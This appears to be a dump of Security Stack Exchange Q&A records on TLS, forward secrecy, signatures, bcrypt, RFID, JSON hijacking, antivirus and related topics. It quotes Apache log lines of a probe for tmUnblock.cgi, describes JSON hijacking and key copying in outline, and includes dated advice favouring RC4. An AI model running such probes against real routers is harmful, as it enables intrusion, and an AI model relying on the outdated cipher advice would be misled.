<p>Another edit: Let's see... <a href=""https://security.stackexchange.com/a/17655/9786"">here</a> is an indication that BEAST isn't something to be <em>too</em> realistically concerned about, though it negatively affects SSLLabs rating. That big ""A"" looks so good... Let's see... I should probably still put the RC4_128 ciphers in the beginning of the cipher chain if for no other reason that they have not been shown to be ""broken"", and are faster than AES generally. Anyway I've strayed far away from the original topic which is ECDHE. And how to get the DH parameters properly working with Node/Express?</p>
","<p>The traditional RSA-based exchange in SSL is nice in that a random session key is generated and transmitted using asymmetric encryption, so only the owner of the private key can read it. This means that the conversation cannot be decrypted by anyone unless they have the certificate's private key. But if a third party saves the encrypted traffic and eventually acquires the private key, he can use that to decrypt the session key from SSL exchange, and then use that to decrypt the whole session. So that's <em>not</em> perfect forward secrecy.</p>

<p>The key here to Perfect Forward Secrecy is the <a href=""http://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange"" rel=""nofollow noreferrer"">Diffie-Hellman key exchange</a>. DH is a very cool algorithm for generating a shared key between two parties such that an observer who sees <em>everything</em> -- the whole exchange between the two parties in the clear -- cannot derive the key just from what is sent over the wire. The derived secret key is used one time, never stored, never transmitted, and can never be drived ever again by anyone. In other words, perfect forward secrecy.</p>

<p>DH alone can't protect you because it's trivial to play man-in-the-middle as there's no identity and no authentication. So you can continue to use RSA for the authentication and just use Diffie-Hellman to generate the session key. That's <code>DHE-RSA-*</code>, so for example: <code>DHE-RSA-AES128-SHA1</code> is a cipher spec that uses Diffie-Hellman to generate the key, RSA for authentication, AES-128 for encryption, and SHA1 for digests.</p>

<p>But Diffie-Hellman requires some set-up parameters to begin with. These aren't secret and can be reused; plus they take several seconds to generate. But they should be ""clean"", generated by you so you know they're not provided by an attacker. The <code>dhparam</code> step generates the DH params (mostly just a single large prime number) ahead of time, which you then store for the server to use.</p>

<p>Some recent bit of research showed that while ""breaking"" a DH exchange (that is, deriving the key from the traffic) is difficult, a fair amount of that difficult work can be done ahead of time simply based on the primes. This means that if the same DH primes are used everywhere, those become a  ""prime"" target for well-funded agencies to run their calculations against. This suggests that there is some amount of increased safety to be had in generating <em>your own</em> primes (rather than relying on those that come with your software), and perhaps in re-generating those primes periodically.</p>

<p>An interesting bit is that <a href=""http://en.wikipedia.org/wiki/Elliptic_curve_Diffie%E2%80%93Hellman"" rel=""nofollow noreferrer"">Elliptic curve Diffie–Hellman</a> is  a modified Diffie-Hellman exchange which uses Elliptic curve cryptography instead of the traditional RSA-style large primes. So while I'm not sure what parameters it may need (if any), I don't think it needs the kind you're generating.</p>

<p>See also:</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/14731/what-is-ecdhe-rsa"">What is ECDHE-RSA?</a></li>
<li><a href=""http://vincent.bernat.im/en/blog/2011-ssl-perfect-forward-secrecy.html"" rel=""nofollow noreferrer"">SSL/TLS &amp; Perfect Forward Secrecy</a></li>
</ul>

<p><strong>With respect to BEAST</strong><br>
The BEAST attack relies of some artifacts of the block chaining method used with AES on older versions of SSL. Newer versions of SSL do things right, so no worries there. RC4 is not a block cipher, so there is no block chaining. The BEAST attack is so absurdly difficult to pull off that its real-world implications are decidedly nonexistent. In fact, RC4 has some weaknesses of its own, especially when when abused the way the BEAST attack would have to do. So you may not actually be getting any better security. </p>

<p>Certainly forcing TLS 1.2 would solve all your theoretical security problems, while at the same time preventing many visitors from actually connecting. Not entirely unlike using ECDHE.</p>
","38207"
"What is the difference between an electronic signature and a digital signature","24198","","<p>From <a href=""http://en.wikipedia.org/wiki/Electronic_signature"">Wikipedia</a>:</p>

<blockquote>
  <p>An <strong>electronic signature,</strong> or e-signature, is any electronic means
  that indicates either that a person adopts the contents of an
  electronic message, or more broadly that the person who claims to have
  written a message is the one who wrote it (and that the message
  received is the one that was sent). By comparison, a signature is a
  stylized script associated with a person. In commerce and the law, a
  signature on a document is an indication that the person adopts the
  intentions recorded in the document. Both are comparable to a seal.</p>
  
  <p>Increasingly, encrypted <strong>digital signatures</strong> are used in e-commerce
  and in regulatory filings as digital signatures are more secure than a
  simple generic <strong>electronic signature</strong>.<a href=""http://en.wikipedia.org/wiki/Electronic_signature"">1</a>[2][3] The concept itself
  is not new, with common law jurisdictions having recognized telegraph
  signatures as far back as the mid-19th century and faxed signatures
  since the 1980s.</p>
</blockquote>

<ol>
<li>I was wondering what relations and differences are between
electronic signature and digital signature?</li>
<li>If digital signature is just a special kind of electronic signature,
what are other kinds of electronic signature?</li>
</ol>

<p>Thanks!</p>
","<p>An electronic signature is any author identification and verification mechanism used in an electronic system. This could be a scan of your real hand-written signature, or any kind of electronic authenticity stamp. It's a generic term that covers a lot of authenticity measures.</p>

<p>A digital signature is a type of electronic signature. It is a signature generated by a computer for a specific document, for the purposes of strong authenticity verification. For example, in asymmetric cryptography, a private key might be used to sign a hash of a document, which anyone in possession of the corresponding public key can verify but not forge. It also prevents modification of the document after the signature is generated. This allows one user to place a digital signature on a document, and many other users to verify that the signature is correct.</p>

<p>A digital signature scheme might work as follows:</p>

<ol>
<li>Alice generates an asymmetric key pair (e.g. RSA)</li>
<li>Alice computes a cryptographic hash (e.g. SHA256) of the document.</li>
<li>Alice encrypts the hash using her private key.</li>
<li>Alice makes her public key available to anyone who wants it.</li>
<li>Bob downloads the document and a copy of Alice's public key.</li>
<li>Bob computes a cryptographic hash of the document.</li>
<li>Bob decrypts the signature value stored in the document using Alice's public key.</li>
<li>Bob compares the decrypted hash with the hash he computed. If they match, the document is authentic.</li>
</ol>

<p>In the next scenario, Eve fails to subvert the process:</p>

<ol>
<li>Alice publishes her public key and the signed document.</li>
<li>Eve downloads them, but wants to modify the document. Since Eve only has the public key, she cannot forge the signature.</li>
<li>Eve modifies the document anyway, and gives it to Bob.</li>
<li>Bob opens the document and checks that the hash matches the signature. It does not, so he knows that the document has been modified or the signature forged.</li>
</ol>

<p><em>Disclaimer: IANAL</em> - In terms of legal standing (at least in the UK, pretty sure the US too) an electronic signature, in the form of a scanned image of the signer's hand-written signature, is considered to be legally binding. However, it is often trivial to extract the signature and use it on other documents without the author's permission. In the case of a dispute, most courts require some sort of digital signature of authenticity to prove that the electronic copy of the physical signature is authentic.</p>
","17563"
"How to do client side hashing of password using BCrypt?","24178","","<p>I am migrating an old application which used MD5 hashing to Spring Security with BCrypt encoding of passwords. I want to encode the password on new user creation page, change password page and on login page before it is sent to the network. </p>

<p>I know HTTPS can solve the problem, but I am still instructed to encode the password before sending it over network as per our organizational guidelines. </p>

<p>What could be the best possible solution to do hashing of the passwords using JavaScript?</p>

<p>Just to explain it further, I am using JCryption API for encrypting the password using AES, so the value transmitted over network is <code>AES(SHA1(MD5(plain password)))</code> now I want to replace <code>MD5</code> with <code>Bcrypt</code> only. Rest of the things remain unchanged. Will this approach work against ""Man in the middle attack"" ?</p>
","<h1>bcrypt is not meant for this type of client-side hashing</h1>

<p>A key property of bcrypt is that, when run two independent times with the same plaintext, most implementations will produce different hashes. This is due to the use of a salt, which is designed to make it difficult to see if two different users have the same password.</p>

<p>In contrast, login forms need to receive the same data every time. After all, how else would you verify that the password the user typed today is the same as what they typed yesterday?</p>

<p>So, you have an algorithm designed to produce <em>different</em> data each time, and you're feeding it into an application that needs to verify the data is the <em>same</em> each time. That's probably an indication that the algorithm is not being used as intended.</p>

<p>What you should ideally be doing is <strong>using bcrypt to hash passwords on the server</strong>. That's what bcrypt was designed for: protecting user passwords during times when the plaintext is not in memory, which is by far the most common state (e.g., DB dumps would reveal only the hashed password, not the plaintext, if implemented correctly).</p>

<p>I personally see some value in client-side hashing as well, because it does help protect against attackers who can sniff the traffic (or who have server access). However, I don't know of a way to make client-side hashing as secure as server-side bcrypt - which is why you should still be using server-side bcrypt.</p>

<h1>If you must use bcrypt client-side, use a static salt</h1>

<p>If you're GOING to use bcrypt for client-side hashing of a login form, and you want it to be a drop-in replacement for MD5, you need to use a static salt. Especially if you're passing it through SHA1, because that would mangle the bcrypt salt as well as the hashed data itself.</p>

<p>This does break several design assumptions of bcrypt (such as always using a random salt), of course.</p>

<p>I'd personally recommend using the username as a salt (so that it's difficult to tell whether two different users have the same password); however, I don't know of any research that's been done on salting in this context.</p>

<h1>AES (or any symmetric cipher) is useless here, too</h1>

<p>Keep in mind that AES is a symmetric algorithm, meaning that you need the same key to decrypt <em>and</em> to encrypt data.</p>

<p>What does this mean for you? Well, you've probably got your encryption key in the JavaScript source, which is served to any client that visits your login page. AES is a symmetric cipher, so your encryption key (which is identical to the decryption key) should be kept private. In other words, <strong>your private key is known to the world</strong> - it provides effectively no security at this point.</p>

<p>What you should be using instead is <strong>public key cryptography, such as PGP or HTTPS</strong> (technically, HTTPS uses a hybrid approach). Seriously, <strong>just use HTTPS</strong>, unless your organization refuses to let you have an SSL certificate, for some reason. Keep in mind that PGP won't really protect against active MITM attacks, but it would at least protect against eavesdropping.</p>
","93456"
"How can RFID/NFC tags not be cloned when they are passive technology?","24170","","<p>Everywhere a question like this is asked, I see people responding that (in a scenario where a card is used) the card does some processing with the data it receives/generates some data when it receives a signal. How is this possible without power?</p>

<p>And even if that's the case, why can't every NFC tag in, let's say, credit cards just be cloned because there are no variables in them and only static data? You'd think those RFID tags could be copied and used for transactions.</p>
","<p>Because the cards contain a chip which are powered by a coil.
The coil is not really a antenna, but half of a transformer.</p>

<p>Think your regular mobile charger. This contains a transformer, that will transform the voltage from 230V or 120V AC to 5V DC. This is done by having a coil magnetize some iron, and this iron magnetizes the ""receiving coil"". If you draw current from the receiving coil, the primary coil will also draw more current.</p>

<p>Now, let's go to the ""passive"" card again.</p>

<p>The reader is one half of a transformer, and the card is one half of a transformer, but this transformer does create a magnetic field in the air instead of magnetizing iron.
When you put the card close to the reader, the reader and card becomes a full transformer, and thus the card can be powered, like it was connected to a battery.</p>

<p>For the reader to transmit information to the card, the reader only needs to vary the frequency or amplitude of the AC voltage that powers the primary coil. The card can sense this and act on this information.
For the card to send information back to the reader, the card simply short-circuits its own antenna via a transistor and a resistor. This will, like the mobile charger, cause the primary coil, i.e. the coil in the reader, to consume more current, and the reader can sense this (by having the primary reader coil via a resistor and then measure the voltage over the resistor) and read the data the chip sends to the reader.</p>

<p>This means that half-duplex bidirectional communication is possible with RFID, thus the chip can do anything, and work like a contact smart-card.
And as you know, a contact smart card with a security chip, that can securely store a key, and only perform operations with the key, is impossible to ""clone"" or ""copy"" as the key cannot be extracted. That's the security of smart cards, they cannot be cloned, and that's why they are preferred over magnetic strip cards.</p>

<p>Thus, the same applies to wireless/contactless RFID card.</p>
","131640"
"Setting up Windows laptops to require a smartcard for unlocking","24155","","<p>I am looking for details on how to secure a windows laptop using smart cards.</p>

<p>The scenario is that we have laptops in vehicles, which remotely connect (via https) to an application server over the internet.  Scheduling and payment applications run on the laptop.  The operator is often away from the vehicle when performing work at a customer's location.</p>

<p>To use the system, the operator should insert their smart card into the reader on the laptop.  This should unlock the laptop.
I want the application server to have client-side certificates which somehow are stored (or activated) using the smart card.
Thus if the vehicle/laptop get stolen or compromised the thief cannot access the server without the smart card.</p>

<p>Certainly we can deactivate the user account/revoke certificate after we discover the laptop has been stolen, but its the time in between where unauthorized access may be possible.</p>

<p>In an ideal world, I would love wireless (bluetooth?) smart cards, so the operator does not actually have to insert any card, just be close. (like this: <a href=""https://security.stackexchange.com/questions/2195/blackberry-rim-bluetooth-based-smart-card-reader"">Blackberry + RIM Bluetooth-based Smart Card Reader</a>)</p>
","<p>Assuming the laptops to run under Windows, you would need the following:</p>

<ul>
<li><p>a <a href=""http://en.wikipedia.org/wiki/Public-key_infrastructure"">PKI solution</a> to initialize and manage smart cards; each smart card will contain a private key and the associated certificate;</p></li>
<li><p>to enable <a href=""http://technet.microsoft.com/en-us/library/ff404294%28v=ws.10%29.aspx"">smart card logon</a> so that users open a session on the laptop with the smart card, instead of a password (the smart card itself will require entry of a PIN code);</p></li>
<li><p>to set a local policy which <a href=""http://msdn.microsoft.com/en-us/library/ms814347.aspx"">locks the laptop when the card is removed</a> (that one is easy);</p></li>
<li><p>to activate certificate-based client authentication on the HTTPS server (see <a href=""http://technet.microsoft.com/en-us/library/cc732996%28v=ws.10%29.aspx"">this</a> if the server is IIS).</p></li>
</ul>

<p>I have done all of this with <a href=""http://www.gemalto.com/products/dotnet_card/"">that kind of cards</a>; they come in several form factors, including as ""USB keys"" (actually USB-based smart card <em>readers</em> with an embedded smart card), which are convenient since all laptops have USB ports. The biggest cost is the PKI; not really the software, especially since there are <a href=""http://www.ejbca.org/"">free PKI</a> (and you will want to have a look at <a href=""http://www.ejbca.org/howto.html#Microsoft%20smart%20card%20logon"">this</a>, by the way). 95% of PKI is <em>procedures</em>, i.e. people who spend some time doing things and checking that they did it right and auditing that other people did things right.</p>
","33099"
"How should web app developers defend against JSON hijacking?","24142","","<p>What is the best defense against <a href=""http://haacked.com/archive/2009/06/25/json-hijacking.aspx"">JSON hijacking</a>?</p>

<p>Can anyone enumerate the standard defenses, and explain their strengths and weaknesses?  Here are some defenses that I've seen suggested:</p>

<ol>
<li>If the JSON response contains any confidential/non-public data, only serve the response if the request is authenticated (e.g., comes with cookies that indicate an authenticated session).</li>
<li>If the JSON data contains anything confidential or non-public, host it at a secret unguessable URL (e.g., a URL containing a 128-bit crypto-quality random number), and only share this secret URL with users/clients authorized to see the data.</li>
<li>Put <code>while(1);</code> at the start of the JSON response, and have the client strip it off before parsing the JSON.</li>
<li>Have the client send requests for JSON data as a POST (not a GET), and have the server ignore GET requests for JSON data.</li>
</ol>

<p>Are these all secure?  Are there any reasons to choose one of these over the others?  Are there any other defenses I'm missing?</p>
","<p>The first defence is to <strong>stick to the specification</strong> by using valid JSON which <a href=""http://json.org/"">requires an object as top level entity</a>. All known attacks are based on the fact that if the top level object is an array, the response is valid Java Script code that can be parsed using a &lt;script&gt; tag.</p>

<blockquote>
  <p>If the JSON response contains any confidential/non-public data, only serve the response if the request is authenticated (e.g., comes with cookies that indicate an authenticated session).</p>
</blockquote>

<p>That's the <strong>pre requisite for the attack</strong>, not a mitigation. If the browser has a cookie for site A, it will include it in all requests to site A. This is true even if the request was triggered by a &lt;script&gt; tag on site B.</p>

<blockquote>
  <p>If the JSON data contains anything confidential or non-public, host it at a secret unguessable URL (e.g., a URL containing a 128-bit crypto-quality random number), and only share this secret URL with users/clients authorized to see the data.</p>
</blockquote>

<p><strong>URLs are not considered a security feature</strong>. All the common search engines have browser addons/toolbars that report any visited URL back to the search engine vendor. While they might only report URLs that are explicitly visited, I wouldn't risk this for JSON URLS either.</p>

<blockquote>
  <p>Have the client send requests for JSON data as a POST (not a GET), and have the server ignore GET requests for JSON data.</p>
</blockquote>

<p>This will prevent the &lt;script&gt; include.</p>

<blockquote>
  <p>Put while(1); at the start of the JSON response, and have the client strip it off before parsing the JSON.</p>
</blockquote>

<p>I suggest a modified version of this approach: <strong>Add <code>&lt;/*</code> at the beginning</strong>. <code>while(1)</code> is problematic for two reasons: First it is likely to trigger  maleware scanner (on clients, proxies and search engine). Second it can be used for DoS attacks against the CPU of web surfers. Those attacks obviously originate from your server .</p>
","7003"
"How do the processes for digital certificates, signatures and ssl work?","24112","","<p>I have been trying to understand how ssl works. Instead of Alice and Bob, lets consider client and server communication.
Server has a digital certificate acquired from a CA. It also has public and private keys.
Server wants to send a message to Client. Server's public key is already available to client.</p>

<p>Assuming that ssl handshake is completed.</p>

<p><strong>Server to Client</strong>:</p>

<ul>
<li>Server attaches its public key to the message.</li>
<li>Runs hash function on (message+public key). Results is known as HMAC.</li>
<li>Encrypt HMAC using it's private key. Result is called digital
signature.</li>
<li>Send it to Client along with the digital certificate.</li>
<li>Client checks the certificate and finds that it's from the expected
Server.</li>
<li>Decrypts HMAC using Server's public key.</li>
<li>Runs the hash function on (message+public key) to obtain the original
message.</li>
</ul>

<p><strong>Client to Server</strong></p>

<ul>
<li>Client runs hash function on (message+public key) and then encrypts
using the same public key.</li>
<li>Server decrypts using private key, runs the hash function on the
resultant data to obtain the message.</li>
</ul>

<p>Please let me know if my understanding is correct.</p>
","<p>There are a few confusions in your post. First of all, <a href=""http://en.wikipedia.org/wiki/HMAC"" rel=""nofollow noreferrer"">HMAC</a> is not a <a href=""http://en.wikipedia.org/wiki/Cryptographic_hash_function"" rel=""nofollow noreferrer"">hash function</a>. More about HMAC later on.</p>

<p><strong>Hash Functions</strong></p>

<p>A <em>hash function</em> is a completely public algorithm (no key in that) which mashes bit together in a way which is truly infeasible to untangle: anybody can run the hash function on any data, but finding the data back from the hash output appears to be much beyond our wit. The hash output has a fixed size, typically 256 bits (with SHA-256) or 512 bits (with SHA-512). The SHA-* function which outputs 160 bits is called SHA-1, not SHA-160, because cryptographers left to their own devices can remain reasonable for only that long, and certainly not beyond the fifth pint.</p>

<p><strong>Signature Algorithms</strong></p>

<p>A <em>signature</em> algorithm uses a pair of keys, which are mathematically linked together, the <em>private key</em> and the <em>public key</em> (recomputing the private key from the public key is theoretically feasible but too hard to do in practice, even with Really Big Computers, which is why the public key and be made public while the private key remains private). Using the mathematical structure of the keys, the signature algorithm allows:</p>

<ul>
<li>to <em>generate</em> a signature on some input data, using the private key (the signature is a mathematical object which is reasonably compact, e.g. a few hundred bytes for a typical RSA signature);</li>
<li>to <em>verify</em> a signature on some input data, using the public key. Verification takes as parameters the signature, the input data, and the public key, and returns either ""perfect, man !"" or ""dude, these don't match"".</li>
</ul>

<p>For a secure signature algorithm, it is supposedly unfeasible to produce a signature value and input data such that the verification algorithm with a given public key says ""good"", <em>unless</em> you know the corresponding private key, in which case it is easy and efficient. Note the fine print: without the private key, you cannot conjure some data <em>and</em> a signature value which work with the public key, even if you can choose the data and the signature as you wish.</p>

<p>""Supposedly unfeasible"" means that all the smart cryptographers in the world worked on it for several years and yet did not find a way to do it, even after the fifth pint.</p>

<p>Most (actually, all) signature algorithms begin by processing the input data with a hash function, and then work on the hash value alone. This is because the signature algorithm needs mathematical objects in some given sets which are limited in size, so they need to work on values which are ""not too big"", such as the output of a hash function. Due to the nature of the hash function, things work out just well (signing the hash output is as good as signing the hash input).</p>

<p><strong>Key Exchange and Asymmetric Encryption</strong></p>

<p>A <em>key exchange protocol</em> is a protocol in which both parties throw mathematical objects at each other, each object being possibly linked with some secret values that they keep for them, in a way much similar to public/private key pairs. At the end of the key exchange, both parties can compute a common ""value"" (yet another mathematical object) which totally evades the grasp of whoever observed the bits which were exchanged on the wire. One common type of key exchange algorithm is <em>asymmetric encryption</em>. Asymmetric encryption uses a public/private key pair (not necessarily the same kind than for a signature algorithm):</p>

<ul>
<li>With the public key you can <em>encrypt</em> a piece of data. That data is usually constrained in size (e.g. no more than 117 bytes for RSA with a 1024-bit public key). Encryption result is, guess what, a mathematical object which can be encoded into a sequence of bytes.</li>
<li>With the private key, you can <em>decrypt</em>, i.e. do the reverse operation and recover the initial input data. It is assumed that without the private key, tough luck.</li>
</ul>

<p>Then the key exchange protocol runs thus: one party chooses a random value (a sequence of random bytes), encrypts that with the peer's public key, and sends him that. The peer uses his private key to decrypt, and recovers the random value, which is the shared secret.</p>

<p>An historical explanation of signatures is: ""encryption with the private key, decryption with the public key"". <em>Forget</em> that explanation. It is wrong. It may be true only for a specific algorithm (RSA), and, then again, only for a bastardized-down version of RSA which actually fails to have any decent security. So <strong>no</strong>, digital signatures are not asymmetric encryption ""in reverse"".</p>

<p><strong>Symmetric Cryptography</strong></p>

<p>Once two parties have a shared secret value, they can use <a href=""http://en.wikipedia.org/wiki/Symmetric-key_algorithm"" rel=""nofollow noreferrer"">symmetric cryptography</a> to exchange further data in a confidential way. It is called symmetric because both parties have the same key, i.e. the same knowledge, i.e. the same power. No more private/public dichotomy. Two primitives are used:</p>

<ul>
<li><a href=""http://en.wikipedia.org/wiki/Symmetric-key_algorithm"" rel=""nofollow noreferrer"">Symmetric encryption</a>: how to mangle data and unmangle it later on.</li>
<li><a href=""http://en.wikipedia.org/wiki/Message_authentication_code"" rel=""nofollow noreferrer"">Message Authentication Codes</a>: a ""keyed checksum"": only people knowing the secret key can compute the MAC on some data (it is like a signature algorithm in which the private and the public key are identical -- so the ""public"" key had better be not public !).</li>
</ul>

<p>HMAC is a kind of MAC which is built over hash functions in a smart way, because there are many non-smart ways to do it, and which fail due to <a href=""https://crypto.stackexchange.com/questions/879/what-is-the-random-oracle-model-and-why-is-it-controversial/880#880"">subtle details</a> on what a hash function provides and does NOT provide.</p>

<p><strong>Certificates</strong></p>

<p>A <em>certificate</em> is a container for a public key. With the tools explained above, one can begin to envision that the server will have a public key, which the client will use to make a key exchange with the server. But how does the client make sure that he is using the right server's public key, and not that of a devious attacker, a villain who cunningly impersonates the server ? That's where certificates come into play. A certificate is <em>signed</em> by someone who is specialized in verifying physical identities; it is called a <em>Certificate Authority</em>. The CA meets the server ""in real life"" (e.g. in a bar), verifies the server identity, gets the server public key from the server himself, and signs the whole lot (server identity <em>and</em> public key). This results in a nifty bundle which is called a certificate. The certificate represents the guarantee <em>by the CA</em> that the name and public key match each other (hopefully, the CA is not too gullible, so the guarantee is reliable -- preferably, the CA does <em>not</em> sign certificates after its fifth pint).</p>

<p>The client, upon seeing the certificate, can verify the signature on the certificate relatively to the CA public key, and thus gain confidence in that the server public key really belongs to the intended server.</p>

<p>But, you would tell me, what have we gained ? We must still know a public key, namely the CA public key. How do we verify that one ? Well, we can use <em>another</em> CA. This just moves the issue around, but it can end up with the problem of knowing <em>a priori</em> a unique or a handful of public keys from über-CAs which are not signed by anybody else. Thoughtfully, Microsoft embedded about a hundred of such ""root public keys"" (also called ""trust anchors"") deep within Internet Explorer itself. This is where trust originates (precisely, you forfeited the basis of your trust to the Redmond firm -- now you understand how Bill Gates became the richest guy in the world ?).</p>

<p><strong>SSL</strong></p>

<p>Now let's put it all together, in the SSL protocol, which is now known as <a href=""http://tools.ietf.org/html/rfc5246"" rel=""nofollow noreferrer"">TLS</a> (""SSL"" was the protocol name when it was a property of Netscape Corporation).</p>

<p>The client wishes to talk to the server. It sends a message (""ClientHello"") which contains a bunch of administrative data, such as the list of encryption algorithms that the client supports.</p>

<p>The server responds (""ServerHello"") by telling which algorithms will be used; then the server sends his certificate (""Certificate""), possibly with a few CA certificates in case the client may need them (not root certificates, but intermediate, underling-CA certificates).</p>

<p>The client verifies the server certificate and extracts the server public key from it. The client generates a random value (""pre-master secret""), encrypts it with the server public key, and sends <em>that</em> to the server (""ClientKeyExchange"").</p>

<p>The server decrypts the message, obtains the pre-master, and derive from it secret keys for symmetric encryption and MAC. The client performs the same computation.</p>

<p>Client sends a verification message (""Finished"") which is encrypted and MACed with the derived keys. The server verifies that the Finished message is proper, and sends its own ""Finished"" message in response. At that point, both client and server have all the symmetric keys they need, and know that the ""handshake"" has succeeded. Application data (e.g. an HTTP request) is then exchanged, using the symmetric encryption and MAC.</p>

<p>There is no public key or certificate involved in the process beyond the handshake. Just symmetric encryption (e.g. 3DES, AES or RC4) and MAC (normally HMAC with SHA-1 or SHA-256).</p>
","8564"
"What is ""tmUnblock.cgi"" and can it be exploited by Shellshock? (Linux / Apache webserver)","24080","","<p>I found what looks like a possible attempted Shellshock attack targeting <code>tmUnblock.cgi</code>, and I'm trying to understand it.</p>

<hr>

<p>I was checking through Apache access logs for a small webserver during the time period between the Shellshock bug becoming news and the server being patched, looking for <a href=""https://security.stackexchange.com/questions/68327/what-do-shellshock-atacks-look-like-in-system-logs"">suspicous entries</a>. </p>

<p>It gets low traffic, so it's actually possible for me to read through the whole access log and spot unusual entries. These are mostly ""white hat"" scans such as <a href=""http://blog.erratasec.com/2014/09/bash-shellshock-scan-of-internet.html#.VCX0o_ldWSo"" rel=""nofollow noreferrer"">Errata Security's ""Shellshock Scan of the Internet""</a>, with the Shellshock attempts visible in the log entry through being present in the user agent.</p>

<p>One, however, looks like it might be a more serious attack attempt: </p>

<pre><code>72.229.125.183 - - [26/Sep/2014:18:16:48 -0400] ""GET /"" 400 464 ""-"" ""-""
72.229.125.183 - - [26/Sep/2014:18:16:48 -0400] ""GET /tmUnblock.cgi HTTP/1.1"" 400 303 ""-"" ""-""
</code></pre>

<p>There's about 4 of these in my logs, all from different IPs, all from after Shellshock was publicised. Their IPs all come from odd, unrelated sources that seem plausible for bots.</p>

<p>The first appears to be a scan (testing vulnerability?), then there's an attempt to target a cgi script. Unlike the white hat stuff like the Erratta Security scan, there's nothing giving away its purpose in the user agent (my understanding is that 'serious' Shellshock attacks will use headers that are not logged). </p>

<p>I've never heard of <code>tmUnblock.cgi</code> and it doesn't appear to exist on my server, so I'm mostly asking out of curiosity (I hope!). What is <code>tmUnblock.cgi</code> and is it something that could be targetted with a shellshock attack?</p>

<p>My own attempts to research tmUnblock.cgi ended in confusion. It seems <a href=""http://xforce.iss.net/xforce/xfdb/91196"" rel=""nofollow noreferrer"">associated with an exploitable bug in Linksys routers discovered in Feb 2014</a>, which seems to be related to executing shell commands and <a href=""http://forums.theregister.co.uk/forum/1/2014/02/17/linksys_vuln_confirmed_as_a_hnap1_bug/"" rel=""nofollow noreferrer"">seems to have been used to propagate worms in the past</a>, but that's all I can find.</p>
","<p><code>tmUnblock.cgi</code> is a binary CGI executable in some Cisco/Linksys router firmwares that has multiple security holes that permit various attacks on the router.  It is unrelated to the ""shellshock"" vulnerability.</p>

<p>Unless your ""small webserver"" is somehow running on a Cisco/Linksys router with stock firmware, the log entries are nothing to worry about.</p>
","68420"
"What's to stop someone from 3D print cloning a key?","24064","","<p>My friend just posted a picture of her key to instagram and it occurred to me that with such a high res photo, the dimensions of the key could easily be worked out.
Therefore the key could be duplicated.
What's to stop someone malicious from abusing this?</p>
","<p>The simple answer is: nothing.</p>

<p>This has already been done for many years, with keys being cast or created from blanks using hand drawn copies, photographs, remembered shapes etc all being successfully used, both by locksmiths and criminals.</p>

<p>A 3D printed key will do just as well, if strong enough, or it could be used to cast a key if necessary, or as pointed out by @EkriirkE - you could use a torque bar to turn the barrel.</p>

<p>You should not ever post picture of keys to a public site, unless it is for something unimportant.</p>
","58217"
"Generating an unguessable token for confirmation e-mails","23962","","<p>I'm generating a token to be used when clicking on the link in a verification e-mail. I plan on using <a href=""http://php.net/manual/en/function.uniqid.php"">uniqid()</a> but the output will be predictable allowing an attacker to bypass the confirmation e-mails.  My solution is to hash it. But that's still not enough because if the hash I'm using is discovered then it will still be predictable. The solution is to salt it. That I'm not sure how to do because if I use a function to give variable salt (e.g. in pseudocode <code>hash(uniqid()+time())</code>) then isn't the uniqueness of the hash no longer guaranteed? Should I use a constant hash and that would be good enough (e.g. <code>hash(uniqid()+asd741)</code>) </p>

<p>I think all answers miss an important point. It needs to be unique. What if <code>openssl_random_pseudo_bytes()</code> procduces the same number twice? Then one user wouldn't be able to activate his account. Is people's counter argument that it's unlikely for it to produce the same number twice? That's why I was considering <code>uniqid()</code> because it's output is unique.</p>

<p>I guess I could use both and append them together.</p>
","<p>You want unguessable randomness. Then, use unguessable randomness. Use <a href=""http://php.net/manual/en/function.openssl-random-pseudo-bytes.php""><code>openssl_random_pseudo_bytes()</code></a> which will plug into the local <a href=""http://en.wikipedia.org/wiki/Cryptographically_secure_pseudorandom_number_generator"">cryptographically strong PRNG</a>. Don't use <a href=""http://www.php.net/manual/en/function.rand.php""><code>rand()</code></a> or <a href=""http://php.net/manual/en/function.mt-rand.php""><code>mt_rand()</code></a>, since these are predictable (<code>mt_rand()</code> is <em>statistically good</em> but it does not hold against sentient attackers). Don't compromise, use a good PRNG. <strong>Don't</strong> try to make something yourself by throwing in hash function and the like; only sorrow lies at the end of this path.</p>

<p>Generate 16 bytes, then encode them into a string if you need a string. <code>bin2hex()</code> encodes in hexadecimal; 16 bytes become 32 characters. <code>base64_encode()</code> encodes in Base64; 16 bytes become 24 characters (the last two of which being '=' signs).</p>

<p>16 bytes is 128 bits, that's the ""safe value"" making collisions so utterly improbable that you don't need to worry about them. Don't go below that unless you have a good reason (and, even then, don't go below 16 anyway).</p>
","40315"
"How are anti viruses so fast?","23918","","<p>The common anti-virus (to my knowledge) uses a kind of brute force type method where they get the hash of the file and compare it to thousands of known virus' hash. Is it just they have servers with super fast SSD and they upload the hashes to that and search really fast or am I completely wrong with my understanding of how they work?</p>
","<p>Disclosure: I work for an anti-virus vendor.</p>

<p>Because most anti-virus engines were born as protecting endpoints, and even now for many of them endpoint protection is major part of business, the modern anti-virus engines are optimized for scanning endpoints. This optimization includes many things, such as:</p>

<ul>
<li><p>Not scanning the files which couldn't contain infections which can infect your computer;</p></li>
<li><p>Remembering which files were scanned, and not scanning them again unless the files were modified;</p></li>
<li><p>Optimizing scans for the file types when possible - for example when scanning executables, only certain parts of it need to be scanned. This minimizes disk reads, and improves performance.</p></li>
</ul>

<p>A common misconception is that AV engines use hashes. They generally do not, for three reasons:</p>

<ol>
<li>First is that getting around hash detection is very easy and doesn't require modifying the actual malicious code at all;</li>
<li>Second is that using hashes does not allow you to implement any kind of proactive protection - you will only be able to detect malware which you have seen;</li>
<li>Calculating a hash requires the whole file to be read, while for some files (such as executables) this is not necessary. And reading the whole file on non-SSD hard drives is expensive operation - most AV engines should scan a large clean executable file faster than calculating hash on it</li>
</ol>
","173299"
"How safe is SSL?","23869","","<p>If I got an SSL certificate for my website and use an SSL secured connection (HTTPS), is this safe enough to send my login and password data or should I add some encryption or hashing?</p>

<p>And how safe is SSL against Man In The Middle attacks? Can they grab or even modify the data sent and received over HTTPS?</p>

<p>And what about GET and POST, are both of them encrypted or is just the answer of the server encrypted or even nothing?</p>

<p>I read Wikipedia and a lot of Google results about SSL and HTTPS but I don't really get it. I really hope that you are able to answer my questions in a simple way so I can finally understand how safe SSL and HTTPS really are.</p>
","<h1>Principle of HTTPS operation</h1>

<p>HTTP protocol is built on top of TCP. TCP guarantees that the data will be delivered, or it is impossible to deliver (target not reachable, etc.). You open a TCP connection and send HTTP messages through it.</p>

